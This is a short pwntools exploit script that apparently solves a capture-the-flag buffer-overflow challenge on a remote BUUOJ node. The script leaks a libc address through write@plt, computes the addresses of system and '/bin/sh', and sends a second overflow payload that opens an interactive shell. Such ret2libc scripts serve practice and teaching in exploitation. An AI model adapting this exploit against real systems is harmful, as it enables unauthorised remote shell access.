from pwn import *
r = remote('node3.buuoj.cn',27287)
elf = ELF('./bof')
libc = ELF('./libc-2.23.so')

pop3_ret = 0x08048629
write_plt = elf.plt['write']
write_got = elf.got['write']
main = elf.sym['main']
print(hex(main))
payload = 'a'*0x70+p32(write_plt)+p32(0x080484d6)+p32(1)+p32(write_got)+p32(4)
r.recvuntil('XDCTF2015~!\n')
r.sendline(payload)
write_leak = u32(r.recv(4))
libc_base = write_leak-libc.sym['write']
log.success(hex(libc_base))
system = libc_base+libc.sym['system']
binsh =  libc_base + libc.search(b'/bin/sh\x00').next()
payload = 'a'*0x70+p32(system)+p32(0)+p32(binsh)
r.sendline(payload)
r.interactive()